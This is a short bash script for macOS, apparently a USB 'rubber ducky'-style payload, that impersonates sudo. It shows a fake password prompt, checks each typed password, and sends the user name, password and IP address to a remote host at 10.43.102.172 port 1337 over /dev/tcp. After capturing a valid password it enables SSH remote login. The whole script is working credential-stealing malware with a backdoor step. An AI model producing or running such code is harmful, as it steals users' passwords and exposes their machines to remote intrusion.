#!/bin/bash
SERVER=/dev/tcp/10.43.102.172/1337
ADDRESS=$(ipconfig getifaddr en0)
echo "You got ducked! Be careful"
/usr/bin/sudo -n true 2>/dev/null
if [ $? -eq 0 ]
then
/usr/bin/sudo $@
else
  while true; do
    echo -n "Password:"
    read -s password
    echo
    echo "$password" | /usr/bin/sudo -S true 2>/dev/null
    if [ $? -eq 1 ]
    then
    echo "$(date) $USER:$password@$ADDRESS -> invalid" > $SERVER
    echo "Sorry, try again."
    else
    echo "$(date) $USER:$password@$ADDRESS -> valid" > $SERVER
    sudo systemsetup -setremotelogin on >/dev/null
    break
    fi
  done
fi
